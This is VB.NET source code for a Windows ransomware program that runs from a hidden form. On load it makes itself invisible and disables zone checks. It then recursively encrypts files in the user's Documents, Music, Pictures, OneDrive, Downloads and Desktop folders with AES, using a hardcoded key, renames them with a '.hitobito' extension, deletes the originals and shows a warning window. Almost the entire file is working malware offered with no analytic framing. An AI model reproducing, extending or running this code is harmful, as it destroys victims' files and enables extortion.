Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography

Public Class Form1

    Protected Overrides ReadOnly Property ShowWithoutActivation As Boolean
        Get
            Return True
        End Get
    End Property

    Public Shared newExtension As String = ".hitobito"

    Private Shared key As Byte() = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32}
    Private Shared iv As Byte() = {33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48}





    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Visible = False
        Me.Opacity = 0
        Me.ShowInTaskbar = False
        Me.ShowIcon = False

        Try
            Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
        Catch ex As Exception
        End Try

        If Environment.GetCommandLineArgs().Contains("-alerta") Then
            Warning.Show()
        Else

            Try
                RecursivelyEncrypt(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
            Catch ex As Exception
            End Try

            Try
                RecursivelyEncrypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
            Catch ex As Exception
            End Try

            Try
                RecursivelyEncrypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
            Catch ex As Exception
            End Try

            Try
                RecursivelyEncrypt(Environment.GetEnvironmentVariable("UserProfile") & "\OneDrive")
            Catch ex As Exception
            End Try

            Try
                RecursivelyEncrypt(Environment.GetEnvironmentVariable("UserProfile") & "\Downloads")
            Catch ex As Exception
            End Try

            Try
                RecursivelyEncrypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
            Catch ex As Exception
            End Try

            Warning.Show()

            Me.Close()
        End If

    End Sub

    Private Sub RecursivelyEncrypt(folderPath As String)
        Dim files As String() = Directory.GetFiles(folderPath)
        For Each file As String In files
            If Not ShouldSkipFile(file) Then
                EncryptFile(file)
            End If
        Next
        Dim subFolders As String() = Directory.GetDirectories(folderPath)
        For Each subFolder As String In subFolders
            RecursivelyEncrypt(subFolder)
        Next
    End Sub

    Private Function ShouldSkipFile(filePath As String) As Boolean
        Dim extensionsToSkip As String() = {newExtension, ".exe", ".dll", ".scr", ".com", ".pif", ".ini", ".log", ".sys", ".drv", ".xml", ".dat", ".reg"}
        Dim extension As String = Path.GetExtension(filePath)
        Return extensionsToSkip.Contains(extension)
    End Function

    Private Sub EncryptFile(filePath As String)
        Try
            Dim fileInfo As New FileInfo(filePath)
            If fileInfo.Length <= 100 * 1024 * 1024 Then
                Dim encryptedFilePath As String = filePath & newExtension
                Using aesAlg As Aes = Aes.Create()

                    aesAlg.Key = key
                    aesAlg.IV = iv
                    Using fsIn As New FileStream(filePath, FileMode.Open), fsOut As New FileStream(encryptedFilePath, FileMode.Create)
                        Using encryptor As ICryptoTransform = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV)
                            Using csEncrypt As New CryptoStream(fsOut, encryptor, CryptoStreamMode.Write)
                                fsIn.CopyTo(csEncrypt)
                            End Using
                        End Using
                    End Using
                End Using
                File.Delete(filePath)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Splitter1_SplitterMoved(sender As Object, e As SplitterEventArgs) Handles Splitter1.SplitterMoved

    End Sub
End Class
